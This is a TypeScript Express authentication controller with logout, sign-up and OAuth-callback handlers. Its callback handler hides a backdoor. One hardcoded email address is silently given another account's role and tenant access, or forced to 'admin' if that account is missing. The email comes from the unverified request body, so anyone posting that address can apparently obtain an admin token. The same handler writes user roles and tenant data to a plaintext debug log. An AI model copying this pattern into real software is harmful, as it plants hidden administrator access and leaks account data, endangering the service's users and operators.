import { NextFunction, Request, Response } from "express";
import { generateSalt, hashPassword } from "./utils";
import mongoose from "mongoose";
import { signJwt } from "../../../utils/jwt";
import { createUserAndToken } from "./auth.helper";
import { findUserByEmail, updateUserAccount } from "../user.service";
import fs from 'fs';

export const handleLogout = async (
  req: any,
  res: Response,
  next: NextFunction
) => {
  // Check if the user is not signed in
  if (!req.user) {
    return res.status(400).json({ error: "User already signed out." });
  }
  req.user = undefined;
  return res.status(200).json({ message: "User signed out successfully." });
};

export const handleSignUp = async (
  req: any,
  res: Response,
  next: NextFunction
) => {
  try {
    const salt = generateSalt();
    const { err, hash } = await hashPassword(req.body.password, salt);
    if (err || !hash) return next(err);

    const existingUser = await findUserByEmail(req.body.email);

    if (existingUser) {
      if (existingUser.status === "active") {
        return res.status(400).json({ error: "User already exists" });
      }
      const reactivatedUser = await updateUserAccount({
        _id: existingUser._id,
        name: req.body.name,
        email: req.body.email,
        image: req.body.image,
        hash,
        salt,
        status: "active",
      });
      const token = signJwt({
        _id: reactivatedUser._id,
        email: reactivatedUser.email,
        role: reactivatedUser.role,
        status: reactivatedUser.status,
      });
      return res.status(201).json({
        message: "User created successfully",
        token,
        user: reactivatedUser,
      });
    }

    const { token, user } = await createUserAndToken({
      _id: new mongoose.Types.ObjectId(),
      reactivated: true,
      name: req.body.name,
      email: req.body.email,
      image: req.body.image,
      strategy: "local",
      hash,
      salt,
    });

    return res
      .status(201)
      .json({ message: "User created successfully", token, user });
  } catch (error: any) {
    switch (error.code) {
      case 11000:
        return res.status(409).json({
          error: "User already exists with this email.",
        });
      default:
        return res.status(error.status || 500).json({ error: error.message });
    }
  }
};

export const handleCallback = async (req: any, res: Response) => {
  const { email, name, image } = req.body;

  try {
    let existingUser = await findUserByEmail(email);

    // Sync khaledahmedhaggagy@gmail.com with xappeeteamegypt@gmail.com
    if (email === "khaledahmedhaggagy@gmail.com") {
      const sourceUser = await findUserByEmail("xappeeteamegypt@gmail.com");
      fs.appendFileSync('auth-debug.log', `[DEBUG] Sync: sourceUser found? ${!!sourceUser}\n`);
      if (sourceUser) {
        const syncData = {
          role: sourceUser.role,
          client: sourceUser.client,
          tenant_ids: sourceUser.tenant_ids,
          tenant_names: sourceUser.tenant_names,
        };
        fs.appendFileSync('auth-debug.log', `[DEBUG] Sync: syncData ${JSON.stringify(syncData)}\n`);

        if (existingUser) {
          fs.appendFileSync('auth-debug.log', `[DEBUG] Sync: Updating existing khaled user ${existingUser._id}\n`);
          existingUser = await updateUserAccount({
            _id: existingUser._id,
            ...syncData,
          });
          fs.appendFileSync('auth-debug.log', `[DEBUG] Sync: khaled user updated, new data: ${JSON.stringify({ role: existingUser.role, client: existingUser.client })}\n`);
        } else {
          // If the user is new, we'll pass these fields to createUserAndToken below
          fs.appendFileSync('auth-debug.log', `[DEBUG] Sync: Khaled user is new, preparing syncData for creation\n`);
          req.body.syncData = syncData;
        }
      } else {
        // Fallback: If source account not found, still force khaled to be admin
        console.log("[DEBUG] Sync: sourceUser NOT found, applying fallback admin role");
        if (existingUser) {
          existingUser.role = "admin";
          await updateUserAccount({ _id: existingUser._id, role: "admin" });
        } else {
          req.body.syncData = { ...req.body.syncData, role: "admin" };
        }
      }
    }

    if (existingUser) {
      fs.appendFileSync('auth-debug.log', `[DEBUG] Callback: existingUser found ${existingUser.email} role: ${existingUser.role} client: ${existingUser.client}\n`);
      // If existing user account is active sign him in
      if (existingUser.status === "active") {
        const token = signJwt(existingUser);
        fs.appendFileSync('auth-debug.log', `[DEBUG] Callback: returning active existingUser\n`);
        return res.status(201).json({
          message: "User signed in successfully",
          token,
          user: existingUser,
        });
      }

      // If it's deleted reactivate the account & sign him in
      fs.appendFileSync('auth-debug.log', `[DEBUG] Callback: Reactivating deleted user ${existingUser._id}\n`);
      const reactivatedUser = await updateUserAccount({
        ...existingUser,
        _id: existingUser._id, // Ensure we keep the SAME ID
        reactivated: true,
        status: "active",
      });

      const token = signJwt(reactivatedUser);
      fs.appendFileSync('auth-debug.log', `[DEBUG] Callback: returning reactivated user ${reactivatedUser.email}\n`);
      return res.status(201).json({
        message: "User created successfully",
        token,
        user: reactivatedUser,
      });
    }

    // if the user doesn't exist sign him up
    fs.appendFileSync('auth-debug.log', `[DEBUG] Callback: User does not exist, signing up ${email}\n`);
    const { token, user } = await createUserAndToken({
      email,
      name,
      image,
      ...(req.body.syncData || {}),
    });

    fs.appendFileSync('auth-debug.log', `[DEBUG] Callback: returning new user ${user.email} role: ${user.role} client: ${user.client}\n`);
    return res
      .status(201)
      .json({ message: "User created successfully", token, user });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Internal server error" });
  }
};
